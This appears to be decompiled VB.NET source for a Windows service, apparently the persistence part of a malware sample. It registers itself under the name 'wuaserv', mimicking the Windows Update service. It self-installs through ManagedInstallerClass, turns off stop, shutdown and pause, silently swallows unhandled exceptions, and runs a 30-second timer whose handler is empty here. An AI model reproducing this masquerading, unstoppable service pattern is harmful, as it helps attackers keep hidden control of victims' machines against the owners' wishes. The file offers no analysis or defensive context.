Imports System
Imports System.Configuration.Install
Imports System.Reflection
Imports System.ServiceProcess
Imports System.Timers

Namespace Main.Tools
	' Token: 0x0200005D RID: 93
	Friend Class Program
		Inherits ServiceBase

		' Token: 0x060001DA RID: 474 RVA: 0x00002AC4 File Offset: 0x00000CC4
		Public Sub New()
			MyBase.ServiceName = "wuaserv"
			Me.DoNotStopTheRock()
		End Sub

		' Token: 0x060001DB RID: 475 RVA: 0x00011534 File Offset: 0x0000F734
		Public Shared Sub cantStopService()
			AddHandler AppDomain.CurrentDomain.UnhandledException, AddressOf Program.CurrentDomainUnhandledException
			If Environment.UserInteractive Then
				Try
					ManagedInstallerClass.InstallHelper(New String() { "/u", Assembly.GetExecutingAssembly().Location })
				Catch
				End Try
				ManagedInstallerClass.InstallHelper(New String() { Assembly.GetExecutingAssembly().Location })
			Else
				ServiceBase.Run(New Program())
			End If
		End Sub

		' Token: 0x060001DC RID: 476 RVA: 0x000024E4 File Offset: 0x000006E4
		Private Shared Sub CurrentDomainUnhandledException(sender As Object, e As UnhandledExceptionEventArgs)
		End Sub

		' Token: 0x060001DD RID: 477 RVA: 0x00002ADD File Offset: 0x00000CDD
		Private Sub DoNotStopTheRock()
			MyBase.CanStop = False
			MyBase.CanShutdown = False
			MyBase.CanPauseAndContinue = False
			MyBase.CanHandlePowerEvent = False
		End Sub

		' Token: 0x060001DE RID: 478 RVA: 0x000115B8 File Offset: 0x0000F7B8
		Protected Overrides Sub OnStart(args As String())
			Dim timer As Timer = New Timer()
			timer.Interval = 30000.0
			AddHandler timer.Elapsed, AddressOf Me.OnTimedEvent
			timer.Enabled = True
			MyBase.OnStart(args)
		End Sub

		' Token: 0x060001DF RID: 479 RVA: 0x000024E4 File Offset: 0x000006E4
		Private Sub OnTimedEvent(sender As Object, e As ElapsedEventArgs)
		End Sub

		' Token: 0x060001E0 RID: 480 RVA: 0x00002AFB File Offset: 0x00000CFB
		Protected Overrides Sub OnStop()
			MyBase.OnStop()
		End Sub
	End Class
End Namespace
